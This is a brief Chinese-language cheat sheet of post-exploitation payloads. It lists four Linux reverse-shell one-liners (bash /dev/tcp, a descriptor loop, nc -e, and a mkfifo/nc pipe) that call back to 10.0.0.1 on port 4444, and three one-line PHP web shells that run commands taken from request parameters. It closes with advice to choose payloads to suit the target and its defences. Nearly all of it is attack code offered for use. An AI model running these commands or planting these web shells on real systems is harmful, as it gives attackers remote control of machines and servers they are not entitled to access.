# 常用 Shell 及回连 Payload

在获取目标执行权限后，常需要反弹或维持持久化访问。

## 反弹 Shell（Linux）

- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
- bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'
- nc -e /bin/sh 10.0.0.1 4444
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

## WebShell (PHP 一行)

- <?php system($_GET['cmd']); ?>
- <?php eval($_POST['x']); ?>
- <?=`$_GET[cmd]`?>

**提示**: 在实际环境中请根据目标系统、语言和防护策略选择合适的 payload。